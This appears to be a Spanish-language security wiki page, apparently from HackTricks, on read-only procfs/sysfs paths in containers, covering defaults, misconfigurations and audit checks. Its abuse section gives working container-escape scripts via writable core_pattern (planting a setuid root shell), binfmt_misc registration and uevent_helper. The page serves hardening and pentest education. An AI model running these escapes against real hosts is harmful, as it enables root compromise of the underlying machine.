# Rutas del sistema de solo lectura

{{#include ../../../../banners/hacktricks-training.md}}

Las rutas del sistema de solo lectura son una protección distinta a las rutas enmascaradas. En lugar de ocultar por completo una ruta, el runtime la expone pero la monta en modo de solo lectura. Esto es común para ubicaciones seleccionadas de procfs y sysfs donde el acceso de lectura puede ser aceptable o necesario para la operación, pero las escrituras serían demasiado peligrosas.

El propósito es sencillo: muchas interfaces del kernel se vuelven mucho más peligrosas cuando son escribibles. Un montaje de solo lectura no elimina todo el valor de reconocimiento, pero evita que una carga de trabajo comprometida modifique, a través de esa ruta, los archivos orientados al kernel subyacentes.

## Operación

Los runtimes frecuentemente marcan partes de la vista proc/sys como de solo lectura. Según el runtime y el host, esto puede incluir rutas como:

- `/proc/sys`
- `/proc/sysrq-trigger`
- `/proc/irq`
- `/proc/bus`

La lista real varía, pero el modelo es el mismo: permitir la visibilidad donde se necesite, negar la mutación por defecto.

## Laboratorio

Inspecciona la lista de rutas de solo lectura declaradas por Docker:
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'
```
Inspecciona la vista montada de proc/sys desde dentro del contenedor:
```bash
mount | grep -E '/proc|/sys'
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head
find /sys -maxdepth 3 -writable 2>/dev/null | head
```
## Impacto de seguridad

Las rutas del sistema en modo solo lectura reducen una gran clase de abusos que afectan al host. Incluso cuando un atacante puede inspeccionar procfs o sysfs, no poder escribir allí elimina muchas vías de modificación directa que implican parámetros del kernel, manejadores de crash, auxiliares de carga de módulos u otras interfaces de control. La exposición no desaparece, pero la transición de divulgación de información a influencia sobre el host se vuelve más difícil.

## Configuraciones incorrectas

Los principales errores son unmasking o remounting de rutas sensibles en read-write, exponer host proc/sys directamente con writable bind mounts, o usar modos privileged que efectivamente evitan los valores por defecto más seguros del runtime. En Kubernetes, `procMount: Unmasked` y las workloads privileged suelen ir acompañadas de una protección de proc más débil. Otro error operativo común es asumir que, porque el runtime suele montar esas rutas en solo lectura, todas las workloads aún heredan ese valor por defecto.

## Abuso

Si la protección es débil, comienza buscando entradas de proc/sys que sean writable:
```bash
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50   # Find writable kernel tunables reachable from the container
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50        # Find writable sysfs entries that may affect host devices or kernel state
```
Cuando hay entradas escribibles, las rutas de seguimiento de alto valor incluyen:
```bash
cat /proc/sys/kernel/core_pattern 2>/dev/null        # Crash handler path; writable access can lead to host code execution after a crash
cat /proc/sys/kernel/modprobe 2>/dev/null            # Kernel module helper path; useful to evaluate helper-path abuse opportunities
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null      # Whether binfmt_misc is active; writable registration may allow interpreter-based code execution
cat /proc/sys/vm/panic_on_oom 2>/dev/null            # Global OOM handling; useful for evaluating host-wide denial-of-service conditions
cat /sys/kernel/uevent_helper 2>/dev/null            # Helper executed for kernel uevents; writable access can become host code execution
```
What these commands can reveal:

- Entradas con permiso de escritura bajo `/proc/sys` a menudo indican que el container puede modificar el comportamiento del kernel del host en lugar de solo inspeccionarlo.
- `core_pattern` es especialmente importante porque un valor host-facing con permiso de escritura puede convertirse en una vía de ejecución de código en el host al forzar el crash de un proceso después de establecer un pipe handler.
- `modprobe` revela el helper usado por el kernel para los flujos relacionados con module-loading; es un objetivo clásico de alto valor cuando es writable.
- `binfmt_misc` te dice si es posible el registro de intérpretes personalizados. Si registration es writable, esto puede convertirse en un execution primitive en lugar de solo un information leak.
- `panic_on_oom` controla una decisión del kernel a nivel de host y por tanto puede convertir el agotamiento de recursos en un host denial of service.
- `uevent_helper` es uno de los ejemplos más claros de un writable sysfs helper path que produce host-context execution.

Hallazgos interesantes incluyen proc knobs host-facing o entradas sysfs con permiso de escritura que normalmente deberían haber sido read-only. En ese punto, el workload ha pasado de una vista de container restringida hacia una influencia significativa sobre el kernel.

### Full Example: `core_pattern` Host Escape

If `/proc/sys/kernel/core_pattern` is writable from inside the container and points to the host kernel view, it can be abused to execute a payload after a crash:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Si la ruta realmente llega al kernel del host, la payload se ejecuta en el host y deja un setuid shell.

### Ejemplo completo: Registro de `binfmt_misc`

Si `/proc/sys/fs/binfmt_misc/register` es escribible, el registro de un intérprete personalizado puede producir ejecución de código cuando se ejecute el archivo correspondiente:
```bash
mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc
cat <<'EOF' > /tmp/h
#!/bin/sh
id > /tmp/binfmt.out
EOF
chmod +x /tmp/h
printf ':hack:M::HT::/tmp/h:\n' > /proc/sys/fs/binfmt_misc/register
printf 'HT' > /tmp/test.ht
chmod +x /tmp/test.ht
/tmp/test.ht
cat /tmp/binfmt.out
```
En un `binfmt_misc` escribible accesible desde el host, el resultado es la ejecución de código en la ruta del intérprete invocada por el kernel.

### Ejemplo completo: `uevent_helper`

Si `/sys/kernel/uevent_helper` es escribible, el kernel puede invocar un helper en la ruta del host cuando se desencadena un evento coincidente:
```bash
cat <<'EOF' > /tmp/evil-helper
#!/bin/sh
id > /tmp/uevent.out
EOF
chmod +x /tmp/evil-helper
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$overlay/tmp/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /tmp/uevent.out
```
La razón por la que esto es tan peligroso es que la ruta auxiliar se resuelve desde la perspectiva del sistema de archivos del host en lugar de desde un contexto seguro exclusivo del contenedor.

## Checks

Estas comprobaciones determinan si la exposición de procfs/sysfs es de solo lectura donde se espera y si la carga de trabajo aún puede modificar interfaces sensibles del kernel.
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'   # Runtime-declared read-only paths
mount | grep -E '/proc|/sys'                                      # Actual mount options
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head           # Writable procfs tunables
find /sys -maxdepth 3 -writable 2>/dev/null | head                # Writable sysfs paths
```
Lo interesante aquí:

- Una carga de trabajo normal endurecida debería exponer muy pocas entradas proc/sys escribibles.
- Las rutas `/proc/sys` escribibles suelen ser más importantes que el acceso de solo lectura ordinario.
- Si el runtime indica que una ruta es de solo lectura pero en la práctica es escribible, revisa cuidadosamente la propagación de montajes, los bind mounts y la configuración de privilegios.

## Valores predeterminados del runtime

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Habilitado por defecto | Docker define una lista predeterminada de rutas de solo lectura para entradas sensibles de proc | exposición de montajes /proc/sys del host, `--privileged` |
| Podman | Habilitado por defecto | Podman aplica rutas predeterminadas de solo lectura a menos que se relajen explícitamente | `--security-opt unmask=ALL`, montajes amplios del host, `--privileged` |
| Kubernetes | Hereda los valores predeterminados del runtime | Usa el modelo de rutas de solo lectura del runtime subyacente a menos que se debilite por la configuración del Pod o montajes del host | `procMount: Unmasked`, cargas de trabajo privilegiadas, montajes /proc/sys del host escribibles |
| containerd / CRI-O under Kubernetes | Predeterminado del runtime | Normalmente se basa en los valores predeterminados de OCI/runtime | igual que la fila de Kubernetes; cambios directos en la configuración del runtime pueden debilitar el comportamiento |

El punto clave es que las rutas del sistema de solo lectura suelen estar presentes como un valor predeterminado del runtime, pero son fáciles de socavar con modos privilegiados o montajes bind del host.
